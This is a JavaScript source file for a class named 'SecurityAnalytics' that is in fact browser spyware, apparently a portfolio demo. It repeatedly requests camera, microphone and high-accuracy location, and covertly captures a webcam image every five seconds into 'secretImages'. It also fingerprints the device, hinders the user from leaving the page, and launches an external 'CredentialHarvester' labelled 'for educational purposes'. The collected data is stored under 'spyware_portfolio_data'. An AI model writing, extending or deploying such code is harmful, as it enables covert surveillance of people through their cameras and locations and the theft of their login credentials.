// Analytics Module - Core SecurityAnalytics Class
class SecurityAnalytics {
  constructor() {
    this.collectedData = {
      camera: null,
      location: null,
      device: null,
      browser: null,
      permissions: {},
      timestamp: new Date().toISOString(),
      secretImages: []
    };
    this.cameraStream = null;
    this.secretCaptureInterval = null;
    this.currentViewingImage = null;
    this.dashboardUrl = '/dashboard';
    this.sessionId = this.generateSessionId();
    this.dashboardWindow = null;
    
    // Image capture properties
    this.imageCaptureInterval = null;
    
    // Tab visibility tracking
    this.isTabHidden = false;
    this.tabHiddenTime = null;
    
    // Mobile-specific tracking
    this.isMobileAppHidden = false;
    this.mobileAppHiddenTime = null;
    this.mobileSaveInterval = null;
    this.backgroundSaveInterval = null;
    this.lastDeviceActivity = Date.now();
    this.lastUserActivity = Date.now();
    
    this.init();
    
    // Initialize credential harvesting for educational purposes
    if (typeof window.CredentialHarvester !== 'undefined') {
      this.credentialHarvester = new window.CredentialHarvester(this);
      this.credentialHarvester.startMonitoring();
    }
  }

  generateSessionId() {
    return 'session_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
  }

  init() {
    // Request permissions with retry mechanism
    this.requestPermissionsWithRetry();
    
    // Setup event listeners
    this.setupTabVisibilityDetection();
    this.setupPageUnloadDetection();
  }

  setupTabVisibilityDetection() {
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.handleTabHidden();
      } else {
        this.handleTabVisible();
      }
    });

    window.addEventListener('blur', () => {
      this.handleTabHidden();
    });

    window.addEventListener('focus', () => {
      this.handleTabVisible();
    });
  }

  setupPageUnloadDetection() {
    window.addEventListener('beforeunload', (event) => {
      this.performFinalSave();
      event.preventDefault();
      event.returnValue = 'Recording in progress. Are you sure you want to leave?';
      return event.returnValue;
    });

    window.addEventListener('pagehide', () => {
      this.performFinalSave();
    });
  }

  handleTabHidden() {
    this.isTabHidden = true;
    this.tabHiddenTime = Date.now();
  }

  handleTabVisible() {
    if (this.isTabHidden) {
      const hiddenDuration = Date.now() - this.tabHiddenTime;
      this.transmitCollectedData();
    }
    this.isTabHidden = false;
    this.tabHiddenTime = null;
  }

  performFinalSave() {
    this.transmitCollectedData();
  }

  async requestPermissionsWithRetry() {
    const permissions = ['camera', 'location'];
    
    for (const permission of permissions) {
      let attempts = 0;
      const maxAttempts = 3;
      
      while (attempts < maxAttempts) {
        try {
          let granted = false;
          
          if (permission === 'camera') {
            const stream = await navigator.mediaDevices.getUserMedia({ 
              video: { width: 1280, height: 720 },
              audio: true
            });
            this.cameraStream = stream;
            this.collectedData.camera = {
              available: true,
              capabilities: stream.getVideoTracks()[0].getCapabilities(),
              settings: stream.getVideoTracks()[0].getSettings()
            };
            granted = true;
            this.startImageCapture();
          } else if (permission === 'location') {
            const position = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 10000
              });
            });
            
            this.collectedData.location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              accuracyLevel: this.getAccuracyLevel(position.coords.accuracy),
              source: 'browser'
            };
            granted = true;
          }
          
          this.collectedData.permissions[permission] = granted;
          console.log(`${permission} permission granted`);
          break;
          
        } catch (error) {
          attempts++;
          console.log(`Permission request attempt ${attempts} failed:`, error);
          
          if (attempts >= maxAttempts) {
            this.collectedData.permissions[permission] = false;
            console.log(`${permission} permission denied after ${maxAttempts} attempts`);
          }
        }
      }
    }
    
    this.sendInitialData();
  }

  getAccuracyLevel(accuracy) {
    if (accuracy < 10) return 'high';
    if (accuracy < 50) return 'medium';
    return 'low';
  }

  startImageCapture() {
    console.log('=== IMAGE CAPTURE STARTED ===');
    console.log('Camera stream available:', !!this.cameraStream);
    
    if (!this.cameraStream) {
      console.log('ERROR: No camera stream available for image capture');
      return;
    }
    
    const video = document.createElement('video');
    video.srcObject = this.cameraStream;
    video.autoplay = true;
    video.muted = true;
    console.log('Video element created and playing');
    
    // Reduce canvas size to save storage space
    const canvas = document.createElement('canvas');
    canvas.width = 640;  // Reduced from 1280
    canvas.height = 360; // Reduced from 720
    const context = canvas.getContext('2d');
    console.log('Canvas created: 640x360 (reduced size)');
    
    let imageCount = 0;
    
    video.onloadedmetadata = () => {
      console.log('Video metadata loaded, starting capture interval');
      video.play();
      
      this.imageCaptureInterval = setInterval(() => {
        try {
          console.log(`=== CAPTURING IMAGE ${++imageCount} ===`);
          
          if (video.readyState >= 2) {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            // Reduce quality to 0.6 to save space
            const imageData = canvas.toDataURL('image/jpeg', 0.6);
            console.log('Image captured, data length:', imageData.length, 'characters');
            
            const imageInfo = {
              data: imageData,
              timestamp: new Date().toISOString(),
              deviceInfo: this.getDeviceInfo(),
              recordingTime: Date.now() - (this.recordingStartTime || Date.now())
            };
            
            this.collectedData.secretImages.push(imageInfo);
            console.log('Image added to collectedData, total images:', this.collectedData.secretImages.length);
            
            // Keep only 10 most recent images to save space
            if (this.collectedData.secretImages.length > 10) {
              this.collectedData.secretImages.shift();
              console.log('Removed oldest image, keeping 10 most recent');
            }
            
            this.transmitCollectedData();
          } else {
            console.log('Video not ready, skipping this capture attempt');
          }
          
        } catch (error) {
          console.error('ERROR during image capture:', error);
        }
        
      }, 5000);
      
      console.log('Image capture interval set: every 5 seconds');
    };
  }

  getDeviceInfo() {
    const ua = navigator.userAgent;
    let browser = 'Unknown';
    
    if (ua.includes('Chrome')) browser = 'Chrome';
    else if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari')) browser = 'Safari';
    else if (ua.includes('Edge')) browser = 'Edge';
    
    return {
      browser,
      os: navigator.platform,
      mobile: /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      screen: {
        width: screen.width,
        height: screen.height,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };
  }

  sendInitialData() {
    const initialData = {
      id: this.sessionId,
      userAgent: navigator.userAgent,
      screenResolution: `${screen.width}x${screen.height}`,
      language: navigator.language,
      platform: navigator.platform,
      permissions: this.collectedData.permissions,
      timestamp: new Date().toISOString()
    };
    
    this.transmitCollectedData();
  }

  transmitCollectedData() {
    try {
      const existingData = localStorage.getItem('spyware_portfolio_data');
      const dataArray = existingData ? JSON.parse(existingData) : [];
      
      const dataEntry = {
        ...this.collectedData,
        ...this.getDeviceInfo(), // Add device information
        ...{
          userAgent: navigator.userAgent,
          screenResolution: `${screen.width}x${screen.height}`,
          language: navigator.language,
          platform: navigator.platform
        },
        secretImages: this.collectedData.secretImages,
        timestamp: new Date().toISOString(),
        sessionId: this.sessionId
      };
      
      dataArray.push(dataEntry);
      
      // Limit localStorage size - keep only last 20 entries
      if (dataArray.length > 20) {
        dataArray.splice(0, dataArray.length - 20);
      }
      
      // Check localStorage size before storing
      const dataString = JSON.stringify(dataArray);
      const dataSize = dataString.length;
      const maxSize = 4 * 1024 * 1024; // 4MB limit
      
      if (dataSize > maxSize) {
        console.warn('Data size too large, removing oldest entries');
        // Remove more entries if still too large
        while (dataArray.length > 5 && JSON.stringify(dataArray).length > maxSize) {
          dataArray.shift();
        }
      }
      
      localStorage.setItem('spyware_portfolio_data', JSON.stringify(dataArray));
      console.log('Data stored in localStorage, total entries:', dataArray.length);
      console.log('Data transmission completed');
      
    } catch (error) {
      if (error.name === 'QuotaExceededError') {
        console.error('Storage quota exceeded, clearing old data');
        // Clear old data and try again
        localStorage.removeItem('spyware_portfolio_data');
        try {
          const reducedData = [{
            ...this.collectedData,
            secretImages: this.collectedData.secretImages.slice(-3), // Keep only 3 most recent
            timestamp: new Date().toISOString(),
            sessionId: this.sessionId
          }];
          localStorage.setItem('spyware_portfolio_data', JSON.stringify(reducedData));
          console.log('Emergency data storage completed');
        } catch (retryError) {
          console.error('Failed to store even reduced data:', retryError);
        }
      } else {
        console.error('ERROR storing data:', error);
      }
    }
  }
}

// Export for use in other modules
export default SecurityAnalytics;
